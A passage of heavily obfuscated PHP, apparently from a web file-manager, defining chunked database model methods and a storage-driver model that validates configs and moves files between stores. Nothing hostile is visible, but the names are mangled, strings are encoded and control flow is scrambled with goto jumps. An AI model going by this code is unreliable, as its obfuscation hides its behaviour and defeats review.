"\40\105\116\x44\x20\40\127\110\105\x52\x45\x20{$e“¾‘¸‘Ç‘[0]}\40\x49\116\x20\50{$aˆª÷ªÌó¹}\x29\40"; $this->execute($fÌ‚¢ÍŠœÁ); goto døÊÀ´Æ¾Ã; aŸ›¾Œ¼Ú¼: $Eò‘²ù”„ = array(); goto Eì±ë‚ñ¦Ò; Eì±ë‚ñ¦Ò: } } goto f”‘¨´Ô; f”‘¨´Ô: $this->chunkEventSet(); goto c†êÃƒİŞŞ; fÙñ¡š‘˜æ: $Cì©•Éº£Ô = is_array($Cì©•Éº£Ô) ? $Cì©•Éº£Ô : array(); $fÌ‚¢ÍŠœÁ = $Fé‰Í½£òÙ[66]; $a‘Şğ—¨¼ê = 0; goto F®©õ¿¶‘é; c†êÃƒİŞŞ: } public function saveAllEach($B†œº’Ç‡Ä) { $a²ÏôÒÖÖÊ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f˜ÌÀåÜ¶Ò = $this->tablePrefix . $this->tableName; foreach ($B†œº’Ç‡Ä as $a”°ï™ïìä) { if (!is_array($a”°ï™ïìä) || count($a”°ï™ïìä) != 4) { continue; } $Câí¦Œ¼—à = $a”°ï™ïìä[0] . $a²ÏôÒÖÖÊ[370] . $a”°ï™ïìä[1] . $a²ÏôÒÖÖÊ[123]; $bº†…Â¥Î = $a”°ï™ïìä[2] . $a²ÏôÒÖÖÊ[370] . $a”°ï™ïìä[3] . $a²ÏôÒÖÖÊ[123]; $eå’ ÊÕÕ = "\x75\x70\x64\x61\164\145\x20{$f˜ÌÀåÜ¶Ò}\40\163\145\x74\x20{$bº†…Â¥Î}\x20\167\150\145\x72\145\40{$Câí¦Œ¼—à}\x3b"; $this->execute($eå’ ÊÕÕ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($A¿÷¤ñ ´Œ = false, $F®àŠÖ·Ğª = false) { $this->_chunkEvent = $A¿÷¤ñ ´Œ; $this->_chunkEventParam = $F®àŠÖ·Ğª; } private function chunkEventCheck($CàõÒ×Œ“) { if (!$this->_chunkEvent) { return; } $FŒâ²©Å• = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $FŒâ²©Å•[$_SERVER[¶ªÕß‚ØÁŸ][371]] = $CàõÒ×Œ“; Hook::trigger($this->_chunkEvent, $FŒâ²©Å•); } public function addAll($FÛ†¸¨Áª», $eô ½èÀ ¢ = array(), $cÜ·¾„¢²« = false) { goto b°éøâĞ²í; dÌ¤‘å‰‘: if (empty($FÛ†¸¨Áª»)) { $this->error = think_lang($A‹¸èí±è[268]); return !1; } $eô ½èÀ ¢ = $this->_parseOptions($eô ½èÀ ¢); foreach ($FÛ†¸¨Áª» as $aÛ£øõİÍ => $c™”•…ƒ”) { $FÛ†¸¨Áª»[$aÛ£øõİÍ] = $this->_facade($c™”•…ƒ”); $this->_beforeInsert($FÛ†¸¨Áª»[$aÛ£øõİÍ], $eô ½èÀ ¢); } goto DÑ‹ƒ‡¿Ù¹; b°éøâĞ²í: $A‹¸èí±è =& $_SERVER[¶ªÕß‚ØÁŸ]; ignore_timeout(); $C›‹Ê±‚¦Á = self::SQL_WHERE_IN_CHUNK; goto dÌ¤‘å‰‘; DÑ‹ƒ‡¿Ù¹: if (method_exists($this->db, $A‹¸èí±è[269])) { for ($bçğÇ¨›ª = 0; $bçğÇ¨›ª < count($FÛ†¸¨Áª»); $bçğÇ¨›ª += $C›‹Ê±‚¦Á) { $Bä¾ğˆ”© = array_slice($FÛ†¸¨Áª», $bçğÇ¨›ª, $C›‹Ê±‚¦Á); if (!is_array($Bä¾ğˆ”©) || count($Bä¾ğˆ”©) == 0) { break; } $E’±ìÍÄŠ† = $this->db->insertAll($Bä¾ğˆ”©, $eô ½èÀ ¢, $cÜ·¾„¢²«); $this->chunkEventCheck(count($Bä¾ğˆ”©)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($FÛ†¸¨Áª» as $aÛ£øõİÍ => $c™”•…ƒ”) { $E’±ìÍÄŠ† = $this->db->insert($c™”•…ƒ”, $eô ½èÀ ¢, $cÜ·¾„¢²«); } $this->commit(); } if (!1 !== $E’±ìÍÄŠ†) { $Dğ˜ËƒöÖ— = $this->getLastInsID(); if ($Dğ˜ËƒöÖ—) { return $Dğ˜ËƒöÖ—; } } return $E’±ìÍÄŠ†; goto Båàïï·¥; Båàïï·¥: } public function save($C½²ôˆêµÆ = '', $dÀÓ»‘©Ñˆ = array()) { goto fĞà•†çù; CØ™ö†¤ˆ: $C» Õ±ƒ¸ = $this->findWhereField($bƒùÕğ£‡§); if (!$C» Õ±ƒ¸) { return parent::save($C½²ôˆêµÆ, $dÀÓ»‘©Ñˆ); } $e°§›¯²† = 0; goto cğç‘ñ°œÍ; cğç‘ñ°œÍ: $c¤»ª³Ò© = $bƒùÕğ£‡§[$Dğ›¾½ãÂ[272]][$C» Õ±ƒ¸][1]; $c¤»ª³Ò© = is_array($c¤»ª³Ò©) ? $c¤»ª³Ò© : array(); $e½øì»çÔ = count($c¤»ª³Ò©); goto dˆ©é©²¸ˆ; fĞà•†çù: $Dğ›¾½ãÂ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aØ¦¨ íÏ = self::SQL_WHERE_IN_CHUNK; $bƒùÕğ£‡§ = $this->optionsValue(); goto CØ™ö†¤ˆ; dˆ©é©²¸ˆ: for ($B¹À¤Ì¦Õ = 0; $B¹À¤Ì¦Õ < $e½øì»çÔ; $B¹À¤Ì¦Õ += $aØ¦¨ íÏ) { $E²Æ”­Ş½ = array_slice($c¤»ª³Ò©, $B¹À¤Ì¦Õ, $aØ¦¨ íÏ); if (!is_array($E²Æ”­Ş½) || count($E²Æ”­Ş½) == 0) { break; } $bƒùÕğ£‡§[$Dğ›¾½ãÂ[272]][$C» Õ±ƒ¸][1] = $E²Æ”­Ş½; $this->optionsValue($bƒùÕğ£‡§); $e°§›¯²† += parent::save($C½²ôˆêµÆ, $dÀÓ»‘©Ñˆ); $this->chunkEventCheck(count($E²Æ”­Ş½)); } $this->chunkEventSet(); return $e°§›¯²†; goto f’‚‹×Á†; f’‚‹×Á†: } public function add($fª„—•½ÉÏ = '', $cŠœºöäĞø = array(), $fà‘ÈÚÌ  = false) { if ($this->addTaskStatus && is_array($fª„—•½ÉÏ)) { $this->addTaskData[] = $fª„—•½ÉÏ; return; } return parent::add($fª„—•½ÉÏ, $cŠœºöäĞø, $fà‘ÈÚÌ ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($F†¹Óæ†Úå = array()) { goto D ôê‹…Í; D·¯­òºøŒ: $B¢·™”İ¸¥ = is_array($B¢·™”İ¸¥) ? $B¢·™”İ¸¥ : array(); $B‰¦Ô¼½ÆÌ = null; for ($A¡É¶íË‡Å = 0; $A¡É¶íË‡Å < count($B¢·™”İ¸¥); $A¡É¶íË‡Å += $fšœÂ©‹Š•) { $cŠ©°ã¼æĞ = array_slice($B¢·™”İ¸¥, $A¡É¶íË‡Å, $fšœÂ©‹Š•); if (!is_array($cŠ©°ã¼æĞ) || count($cŠ©°ã¼æĞ) == 0) { break; } $C‘øÇÂªÚ™[$bë†øÁ†â“[272]][$D½Â‘™ˆ‹Û][1] = $cŠ©°ã¼æĞ; $this->optionsValue($C‘øÇÂªÚ™); $Bñå˜ß—ÄÕ = parent::select($F†¹Óæ†Úå); if (!$Bñå˜ß—ÄÕ) { continue; } if (is_null($B‰¦Ô¼½ÆÌ)) { $B‰¦Ô¼½ÆÌ = array(); } $B‰¦Ô¼½ÆÌ = array_merge($B‰¦Ô¼½ÆÌ, $Bñå˜ß—ÄÕ); } goto F¨İƒ¶ôÕˆ; F¨İƒ¶ôÕˆ: return $B‰¦Ô¼½ÆÌ; goto C…¿§¡ïÔÑ; D ôê‹…Í: $bë†øÁ†â“ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fšœÂ©‹Š• = self::SQL_WHERE_IN_CHUNK; $C‘øÇÂªÚ™ = $this->optionsValue(); goto A™Ò˜ˆŒ¹; A™Ò˜ˆŒ¹: $D½Â‘™ˆ‹Û = $this->findWhereField($C‘øÇÂªÚ™); if (!$D½Â‘™ˆ‹Û || isset($C‘øÇÂªÚ™[$bë†øÁ†â“[289]]) || isset($C‘øÇÂªÚ™[$bë†øÁ†â“[349]])) { return parent::select($F†¹Óæ†Úå); } $B¢·™”İ¸¥ = $C‘øÇÂªÚ™[$bë†øÁ†â“[272]][$D½Â‘™ˆ‹Û][1]; goto D·¯­òºøŒ; C…¿§¡ïÔÑ: } public function delete($aÚ“ÜÊºµˆ = array()) { goto eËôÇãÇ¤†; fçæ—Ï : return $Bøæâï„Ë; goto e¤ÂŸ”ß‡Ù; fßà¤‹ÁÜ¨: $c°Ê‚¤À¿› = $this->findWhereField($DÊ±‚éÂ‘Ğ); if (!$c°Ê‚¤À¿›) { return parent::delete($aÚ“ÜÊºµˆ); } $Bøæâï„Ë = 0; goto A÷…›‰Ü¨Í; eËôÇãÇ¤†: $A‘Á‰ˆ†Øø =& $_SERVER[¶ªÕß‚ØÁŸ]; $CóìôğÃµŒ = self::SQL_WHERE_IN_CHUNK; $DÊ±‚éÂ‘Ğ = $this->optionsValue(); goto fßà¤‹ÁÜ¨; A÷…›‰Ü¨Í: $b£°ùÎ¼º = $DÊ±‚éÂ‘Ğ[$A‘Á‰ˆ†Øø[272]][$c°Ê‚¤À¿›][1]; $b£°ùÎ¼º = is_array($b£°ùÎ¼º) ? $b£°ùÎ¼º : array(); for ($dï•Ã‰Í­è = 0; $dï•Ã‰Í­è < count($b£°ùÎ¼º); $dï•Ã‰Í­è += $CóìôğÃµŒ) { $BÌÃ¡ŠÙ‹Ö = array_slice($b£°ùÎ¼º, $dï•Ã‰Í­è, $CóìôğÃµŒ); if (!is_array($BÌÃ¡ŠÙ‹Ö) || count($BÌÃ¡ŠÙ‹Ö) == 0) { break; } $DÊ±‚éÂ‘Ğ[$A‘Á‰ˆ†Øø[272]][$c°Ê‚¤À¿›][1] = $BÌÃ¡ŠÙ‹Ö; $this->optionsValue($DÊ±‚éÂ‘Ğ); $Bøæâï„Ë += parent::delete($aÚ“ÜÊºµˆ); } goto fçæ—Ï ; e¤ÂŸ”ß‡Ù: } private function findWhereField($FÛÁ·ÖŒò) { $DÖÎÔˆè÷¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cß®«àƒÀˆ = self::SQL_WHERE_IN_CHUNK; if (!is_array($FÛÁ·ÖŒò) || !is_array($FÛÁ·ÖŒò[$DÖÎÔˆè÷¤[272]])) { return !1; } foreach ($FÛÁ·ÖŒò[$DÖÎÔˆè÷¤[272]] as $EÇì¼ÓÙ½¨ => $F˜®…‰ŠëÂ) { if (is_array($F˜®…‰ŠëÂ) && isset($F˜®…‰ŠëÂ[0]) && is_string($F˜®…‰ŠëÂ[0]) && strtolower($F˜®…‰ŠëÂ[0]) == $DÖÎÔˆè÷¤[7] && is_array($F˜®…‰ŠëÂ[1]) && count($F˜®…‰ŠëÂ[1]) > $cß®«àƒÀˆ) { ignore_timeout(); return $EÇì¼ÓÙ½¨; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\117\160\164\151\157\156"; public $field = array(); public function listData($A‚æÙ”˜» = false, $Dçé÷ëŠÓ… = "\x6d\157\144\151\146\171\x54\151\155\145", $e•ŸäÙõÔ = false) { $bÙŠĞİ˜¤¡ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$bÙŠĞİ˜¤¡) { return $A‚æÙ”˜» ? null : array(); } if (!$A‚æÙ”˜») { $bÙŠĞİ˜¤¡ = array_filter(array_values($bÙŠĞİ˜¤¡)); return array_sort_by($bÙŠĞİ˜¤¡, $Dçé÷ëŠÓ…, $e•ŸäÙõÔ); } return $bÙŠĞİ˜¤¡[$_SERVER[¶ªÕß‚ØÁŸ][372] . $A‚æÙ”˜»]; } public function insert($còÏí¯§‰) { goto eí­”´ƒáø; eìªÎÄ÷¼Ö: $e¼„ÕËğ²Á = $e¼„ÕËğ²Á ? $e¼„ÕËğ²Á : 0; $còÏí¯§‰[$DÌ“ñîÖæÚ[375]] = ++$e¼„ÕËğ²Á; $còÏí¯§‰[$DÌ“ñîÖæÚ[197]] = time(); goto f²÷Õ‡Ü; díŞâ‰¸–Ä: return $e¼„ÕËğ²Á; goto Fµ‰ñëÃ‹; f²÷Õ‡Ü: $còÏí¯§‰[$DÌ“ñîÖæÚ[117]] = time(); Model($this->modelType)->set($DÌ“ñîÖæÚ[373], $e¼„ÕËğ²Á, $this->optionType . $DÌ“ñîÖæÚ[374]); Model($this->modelType)->set($DÌ“ñîÖæÚ[372] . $e¼„ÕËğ²Á, $còÏí¯§‰, $this->optionType); goto díŞâ‰¸–Ä; eí­”´ƒáø: $DÌ“ñîÖæÚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $còÏí¯§‰ = array_field_key($còÏí¯§‰, $this->field); $e¼„ÕËğ²Á = Model($this->modelType)->get($DÌ“ñîÖæÚ[373], $this->optionType . $DÌ“ñîÖæÚ[374]); goto eìªÎÄ÷¼Ö; Fµ‰ñëÃ‹: } public function update($fèäŠ‹ØˆÒ, $C¨Î»Ş„ˆÌ) { goto DùÁ¢›ÒŒÃ; DùÁ¢›ÒŒÃ: $DëóËÛ¾ä™ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¨Î»Ş„ˆÌ = array_field_key($C¨Î»Ş„ˆÌ, $this->field); $C‹‹ ¯¤”¤ = $this->listData($fèäŠ‹ØˆÒ); goto Cø§ÃÇõñâ; Cø§ÃÇõñâ: if (!$C‹‹ ¯¤”¤) { return !1; } $C¨Î»Ş„ˆÌ = array_merge($C‹‹ ¯¤”¤, $C¨Î»Ş„ˆÌ); $C¨Î»Ş„ˆÌ[$DëóËÛ¾ä™[117]] = time(); goto Eó™ÏÃ†Æ; Eó™ÏÃ†Æ: return Model($this->modelType)->set($DëóËÛ¾ä™[372] . $fèäŠ‹ØˆÒ, $C¨Î»Ş„ˆÌ, $this->optionType); goto d¦ŠŸĞ¶¿; d¦ŠŸĞ¶¿: } public function remove($AÎÊä’¸ê›) { return Model($this->modelType)->remove($_SERVER[¶ªÕß‚ØÁŸ][372] . $AÎÊä’¸ê›, $this->optionType); } public function clear() { $c¬ì‘™ÖÁå =& $_SERVER[¶ªÕß‚ØÁŸ]; Model($this->modelType)->remove($c¬ì‘™ÖÁå[373], $this->optionType . $c¬ì‘™ÖÁå[374]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($a¿Üçæé»µ, $bÈ’İ‹Œ¬™) { if (!$bÈ’İ‹Œ¬™) { return !1; } $a©ÍÄå¢İÖ = $this->listData(); $a©ÍÄå¢İÖ = array_to_keyvalue($a©ÍÄå¢İÖ, $a¿Üçæé»µ); return isset($a©ÍÄå¢İÖ[$bÈ’İ‹Œ¬™]) ? $a©ÍÄå¢İÖ[$bÈ’İ‹Œ¬™] : !1; } public function findByName($bó»¾«‹Š) { return $this->findByKey($_SERVER[¶ªÕß‚ØÁŸ][28], $bó»¾«‹Š); } protected function resetData($C´•ï¶‚Í…) { $a¬İÔêğøî =& $_SERVER[¶ªÕß‚ØÁŸ]; $C´•ï¶‚Í… = is_array($C´•ï¶‚Í…) ? $C´•ï¶‚Í… : array(); $B¡íÒ‚ÏÙ = array(); for ($bºÍ½”–Áã = 0; $bºÍ½”–Áã < count($C´•ï¶‚Í…); $bºÍ½”–Áã++) { $B¡íÒ‚ÏÙ[$a¬İÔêğøî[372] . $C´•ï¶‚Í…[$bºÍ½”–Áã][$a¬İÔêğøî[375]]] = $C´•ï¶‚Í…[$bºÍ½”–Áã]; } return Model($this->modelType)->set($B¡íÒ‚ÏÙ, !1, $this->optionType); } private function getAutoName($Bƒäî„½…) { $Dˆ‰ˆÒŠ» = array_to_keyvalue($this->listData(), $_SERVER[¶ªÕß‚ØÁŸ][28]); if (!$Dˆ‰ˆÒŠ» || !isset($Dˆ‰ˆÒŠ»[$Bƒäî„½…])) { return $Bƒäî„½…; } for ($b©×ÓƒÅì = 1; $b©×ÓƒÅì < count($Dˆ‰ˆÒŠ»); $b©×ÓƒÅì++) { $F‚‹î‚– = $Bƒäî„½… . "\50{$b©×ÓƒÅì}\x29"; if (!isset($Dˆ‰ˆÒŠ»[$F‚‹î‚–])) { return $F‚‹î‚–; } } return $F‚‹î‚–; } } goto b‘Å°»µµ; EÂ•‰ˆõ‚‰: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\163\164\x6f\162\x61\x67\145\114\151\163\164"; public $field = array("\156\141\x6d\145", "\x73\151\172\145\x4d\x61\170", "\163\x79\163\164\x65\x6d", "\x64\145\x66\x61\x75\x6c\164", "\x64\x72\x69\x76\x65\x72", "\x63\x6f\x6e\146\151\147"); public function listData($b­‘Ù—çâ¬ = false, $fõ¨îëİø‡ = "\x6d\x6f\144\151\146\x79\124\151\155\x65", $DïºÕ¿„§œ = false) { goto eŸñÀ©ôğó; aøŒõ¡ß¤ƒ: foreach ($fá—ÓÕ±âƒ as $e£°ÜíßÉ¬ => $Dµå¹¥²¾¼) { unset($fá—ÓÕ±âƒ[$e£°ÜíßÉ¬][$Eºæ’Îî’‚[6]]); $fá—ÓÕ±âƒ[$e£°ÜíßÉ¬][$Eºæ’Îî’‚[2093]] = 0; } $DºßŞù„®µ = array_to_keyvalue($fá—ÓÕ±âƒ, $Eºæ’Îî’‚[33], $Eºæ’Îî’‚[375]); $this->_listAppendSize($fá—ÓÕ±âƒ, $DºßŞù„®µ); goto AÑ¡Ò¦ÔÔ‡; eŸñÀ©ôğó: $Eºæ’Îî’‚ =& $_SERVER[¶ªÕß‚ØÁŸ]; $fá—ÓÕ±âƒ = parent::listData($b­‘Ù—çâ¬, $fõ¨îëİø‡, $DïºÕ¿„§œ); if ($b­‘Ù—çâ¬) { return $fá—ÓÕ±âƒ; } goto aøŒõ¡ß¤ƒ; AÑ¡Ò¦ÔÔ‡: return $fá—ÓÕ±âƒ; goto e¢·µËÁÃ; e¢·µËÁÃ: } public function _listAppendSize(&$aòÑ”ó‰â¿, $c°ôàÒÑÆ¼) { $C¦…°ÂŒÙ¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$c°ôàÒÑÆ¼) { return; } $Câ™ÓÜ“ÜÌ = $C¦…°ÂŒÙ¤[2372] . implode($C¦…°ÂŒÙ¤[47], $c°ôàÒÑÆ¼) . $C¦…°ÂŒÙ¤[2373]; $BŞ¼ Š„İ… = Model($C¦…°ÂŒÙ¤[732])->query($Câ™ÓÜ“ÜÌ); $BŞ¼ Š„İ… = array_to_keyvalue($BŞ¼ Š„İ…, $C¦…°ÂŒÙ¤[375], $C¦…°ÂŒÙ¤[87]); foreach ($aòÑ”ó‰â¿ as $E²˜š„èëÑ => $Dİ÷¨×ÔÄ) { $aòÑ”ó‰â¿[$E²˜š„èëÑ][$C¦…°ÂŒÙ¤[2093]] = isset($BŞ¼ Š„İ…[$Dİ÷¨×ÔÄ[$C¦…°ÂŒÙ¤[375]]]) ? $BŞ¼ Š„İ…[$Dİ÷¨×ÔÄ[$C¦…°ÂŒÙ¤[375]]] : 0; } } public function getConfig($e¯ƒ¿Ú¾£¬) { $aìãÏ®ÓòÅ = parent::listData($e¯ƒ¿Ú¾£¬); return json_decode($aìãÏ®ÓòÅ[$_SERVER[¶ªÕß‚ØÁŸ][6]], !0); } public function update($FŠà•°Š”„, $E£×äÎé) { goto A–†ô®ñÑ«; c¬§åòé–: $eŸïóœè = parent::update($FŠà•°Š”„, $E£×äÎé); if ($eŸïóœè && $E£×äÎé[$dˆá³¦Ó¬›[34]]) { foreach ($EÃªğ…¦— as $b³Ó‚ğ…İ) { if ($b³Ó‚ğ…İ[$dˆá³¦Ó¬›[34]] && $b³Ó‚ğ…İ[$dˆá³¦Ó¬›[375]] != $FŠà•°Š”„) { parent::update($b³Ó‚ğ…İ[$dˆá³¦Ó¬›[375]], array($dˆá³¦Ó¬›[34] => 0)); } } } return $eŸïóœè; goto fšÅÖ¢§œø; A–†ô®ñÑ«: $dˆá³¦Ó¬› =& $_SERVER[¶ªÕß‚ØÁŸ]; $DÆ¼Ñ» Ú‘ = $E£×äÎé[$dˆá³¦Ó¬›[28]]; $EÃªğ…¦— = array_to_keyvalue(parent::listData(), $dˆá³¦Ó¬›[28]); goto E‹¦ÈƒÜ‘‹; E‹¦ÈƒÜ‘‹: if (isset($EÃªğ…¦—[$DÆ¼Ñ» Ú‘]) && $EÃªğ…¦—[$DÆ¼Ñ» Ú‘][$dˆá³¦Ó¬›[375]] != $FŠà•°Š”„) { return !1; } if (isset($E£×äÎé[$dˆá³¦Ó¬›[2374]]) && $E£×äÎé[$dˆá³¦Ó¬›[2374]] == $dˆá³¦Ó¬›[93]) { $this->checkConfig($E£×äÎé); } unset($E£×äÎé[$dˆá³¦Ó¬›[2374]]); goto c¬§åòé–; fšÅÖ¢§œø: } public function add($B§Æ’‹Î†–) { goto bâë‡æ˜â; D«Ñ¦ãŠ¹: return $cÔ–Ğ’; goto a÷›óİ…÷¬; c—èçÒ×à²: $this->checkConfig($B§Æ’‹Î†–); $cÔ–Ğ’ = parent::insert($B§Æ’‹Î†–); if ($cÔ–Ğ’ && $B§Æ’‹Î†–[$B¦àÔ˜¡ƒÆ[34]]) { foreach ($b¨†Ê¾š‰ as $FŸ¤„‘ƒ‰‚) { if ($FŸ¤„‘ƒ‰‚[$B¦àÔ˜¡ƒÆ[34]]) { parent::update($FŸ¤„‘ƒ‰‚[$B¦àÔ˜¡ƒÆ[375]], array($B¦àÔ˜¡ƒÆ[34] => 0)); } } } goto D«Ñ¦ãŠ¹; bâë‡æ˜â: $B¦àÔ˜¡ƒÆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b¨†Ê¾š‰ = array_to_keyvalue(parent::listData(), $B¦àÔ˜¡ƒÆ[28]); if (isset($b¨†Ê¾š‰[$B§Æ’‹Î†–[$B¦àÔ˜¡ƒÆ[28]]])) { return !1; } goto c—èçÒ×à²; a÷›óİ…÷¬: } public function checkConfig(&$EĞŒ‚§´íĞ) { goto dêÚä¦ó›é; dêÚä¦ó›é: $cŸî½¬ À¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÕÍ±êÇĞ = strtolower($EĞŒ‚§´íĞ[$cŸî½¬ À¨[100]]); $B…†‘Â±ê¹ = json_decode($EĞŒ‚§´íĞ[$cŸî½¬ À¨[6]], !0); goto aòÍ‰ÜåŠ; aòÍ‰ÜåŠ: foreach ($B…†‘Â±ê¹ as $aë•¸æª¦ => $EŒøó¥ÛĞ”) { $B…†‘Â±ê¹[$aë•¸æª¦] = trim($EŒøó¥ÛĞ”); } $aôÂÀ‚êá± = rtrim($B…†‘Â±ê¹[$cŸî½¬ À¨[1028]], $cŸî½¬ À¨[8]) . $cŸî½¬ À¨[8]; $D›ŸªÌ¬ƒ­ = $this->driverType($aÕÍ±êÇĞ); goto FİîìÊ¦³; FİîìÊ¦³: $cóßâæÔÁÖ = $cŸî½¬ À¨[81] . $D›ŸªÌ¬ƒ­; $aŞõô¥ƒÑ = new $cóßâæÔÁÖ($B…†‘Â±ê¹); if (in_array($aÕÍ±êÇĞ, $aŞõô¥ƒÑ->objectDriver)) { if (!$aŞõô¥ƒÑ->isBucketCors() && !$aŞõô¥ƒÑ->setBucketCors()) { $FÒ•£ª»¾ = LNG($cŸî½¬ À¨[2375]); $FÒ•£ª»¾ .= $cŸî½¬ À¨[2376] . LNG($cŸî½¬ À¨[2377]); show_json($FÒ•£ª»¾, !1); } } goto BƒÍ¥¥çÉ; dŒã¾ÜÁğ‘: $EĞŒ‚§´íĞ[$cŸî½¬ À¨[6]] = json_encode($B…†‘Â±ê¹); $EĞŒ‚§´íĞ[$cŸî½¬ À¨[100]] = $D›ŸªÌ¬ƒ­; return !0; goto Dˆ“×ÖÚ; BƒÍ¥¥çÉ: $c°­Ù§¹ã = $aŞõô¥ƒÑ->getPath($aôÂÀ‚êá± . $cŸî½¬ À¨[1989]); if (!$aŞõô¥ƒÑ->mkfile($c°­Ù§¹ã)) { show_json(LNG($cŸî½¬ À¨[2375]), !1); } $B…†‘Â±ê¹[$cŸî½¬ À¨[1028]] = $aôÂÀ‚êá±; goto dŒã¾ÜÁğ‘; Dˆ“×ÖÚ: } private function driverType($C÷–¥˜ ÙÄ) { $EÙƒµºÂó“ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cãï¤Ùø“¡ = array($EÙƒµºÂó“[112] => $EÙƒµºÂó“[2378], $EÙƒµºÂó“[68] => $EÙƒµºÂó“[2379], $EÙƒµºÂó“[74] => $EÙƒµºÂó“[2380]); if (isset($Cãï¤Ùø“¡[$C÷–¥˜ ÙÄ])) { return $Cãï¤Ùø“¡[$C÷–¥˜ ÙÄ]; } return strtoupper($C÷–¥˜ ÙÄ); } public function driverListSystem() { $FæáåØÁøó =& $_SERVER[¶ªÕß‚ØÁŸ]; $cê¿–¢­´Ò = parent::listData(); $E³ğáÖ™÷ = array(); foreach ($cê¿–¢­´Ò as $bšÀÏœ´‰) { unset($bšÀÏœ´‰[$FæáåØÁøó[197]], $bšÀÏœ´‰[$FæáåØÁøó[117]]); $bšÀÏœ´‰[$FæáåØÁøó[6]] = json_decode($bšÀÏœ´‰[$FæáåØÁøó[6]], !0); $E³ğáÖ™÷[] = $bšÀÏœ´‰; } return $E³ğáÖ™÷; } public function defaultDriver() { $c”…½‡ êÉ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e¾„õÒªƒ = parent::listData(); $b«¾„¥­¦  = array_filter_by_field($e¾„õÒªƒ, $c”…½‡ êÉ[34], 1); $b«¾„¥­¦  = $b«¾„¥­¦ [0]; if ($b«¾„¥­¦ ) { $b«¾„¥­¦ [$c”…½‡ êÉ[6]] = json_decode($b«¾„¥­¦ [$c”…½‡ êÉ[6]], !0); } return $b«¾„¥­¦ ; } public function driverInfo($F£¶—½¯á) { $cµæ³’Ä =& $_SERVER[¶ªÕß‚ØÁŸ]; $cœ‹ƒ­«‡µ = array_to_keyvalue(parent::listData(), $cµæ³’Ä[375]); if (!isset($cœ‹ƒ­«‡µ[$F£¶—½¯á])) { return !1; } $A‰È ºã’ = $cœ‹ƒ­«‡µ[$F£¶—½¯á]; $A‰È ºã’[$cµæ³’Ä[6]] = json_decode($A‰È ºã’[$cµæ³’Ä[6]], !0); return $A‰È ºã’; } public function remove($dèŒÍ˜ôµÈ) { $this->removeShareItems($dèŒÍ˜ôµÈ); return parent::remove($dèŒÍ˜ôµÈ); } public function removeWithFile($EÍæÒŒ·ë) { goto D–Ü Ê²Ã; DæÃØ˜­•Ä: $d˜Ö ¡È->task[$A§‚Ë¯±­œ[711]] = (double) $F¬ãà£›¾ä; $Cù¥¡Óì¨­ = KodIO::defaultDriver(); $Aá©†ø¾‘ = $Cù¥¡Óì¨­[$A§‚Ë¯±­œ[375]]; goto a¿âæ¹¼ÍŞ; F‚µ‚­œòØ: $fÊëÛÍ¶³° = Model($A§‚Ë¯±­œ[177])->where($Cçêö˜ôö·)->field($A§‚Ë¯±­œ[2384])->select(); foreach ($fÊëÛÍ¶³° as $BÜ¼»—Ö) { goto e‡¼îÂÂŞâ; Bœ‡²Ì™‹í: if (IO::exist($e–¿ñÌ÷”Æ)) { $d˜Ö ¡È->updateFileEnd($BÜ¼»—Ö[$A§‚Ë¯±­œ[28]], $BÜ¼»—Ö[$A§‚Ë¯±­œ[87]]); continue; } if (!IO::move($b¤­åÌïÄ, get_path_father($e–¿ñÌ÷”Æ))) { $AóÙÑÍÚĞ = !1; break; } $Cçêö˜ôö· = array($A§‚Ë¯±­œ[427] => $BÜ¼»—Ö[$A§‚Ë¯±­œ[427]]); goto dÕîãßÃåÅ; dÕîãßÃåÅ: $D´øñ‚¼‰Ü = array($A§‚Ë¯±­œ[757] => $Aá©†ø¾‘, $A§‚Ë¯±­œ[85] => $e–¿ñÌ÷”Æ); Model($A§‚Ë¯±­œ[177])->where($Cçêö˜ôö·)->save($D´øñ‚¼‰Ü); goto Aæµ¶À¼ÃÕ; e‡¼îÂÂŞâ: $b¤­åÌïÄ = $BÜ¼»—Ö[$A§‚Ë¯±­œ[85]]; $e–¿ñÌ÷”Æ = $eƒ‹Ÿæï . str_replace("\x7b\151\x6f\x3a{$EÍæÒŒ·ë}\175\x2f", $A§‚Ë¯±­œ[33], $b¤­åÌïÄ); if (!IO::exist($b¤­åÌïÄ)) { $fƒõŞæã®é[] = $BÜ¼»—Ö[$A§‚Ë¯±­œ[427]]; $d˜Ö ¡È->updateFileEnd($BÜ¼»—Ö[$A§‚Ë¯±­œ[28]], $BÜ¼»—Ö[$A§‚Ë¯±­œ[87]]); continue; } goto Bœ‡²Ì™‹í; Aæµ¶À¼ÃÕ: } $this->removeByFileID($fƒõŞæã®é); goto f…íÊó„®¥; D–Ü Ê²Ã: $A§‚Ë¯±­œ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cçêö˜ôö· = array($A§‚Ë¯±­œ[757] => $EÍæÒŒ·ë); $f†ôî Àé = Model($A§‚Ë¯±­œ[430])->where($Cçêö˜ôö·)->count(); goto b“Ïƒšò; f…íÊó„®¥: if (!$AóÙÑÍÚĞ) { $d˜Ö ¡È->stop($e¥…ì–‰Ó); return !1; } $d˜Ö ¡È->end(); $this->remove($EÍæÒŒ·ë); goto eÚ×¥Ã™Ì»; a¿âæ¹¼ÍŞ: $eƒ‹Ÿæï = 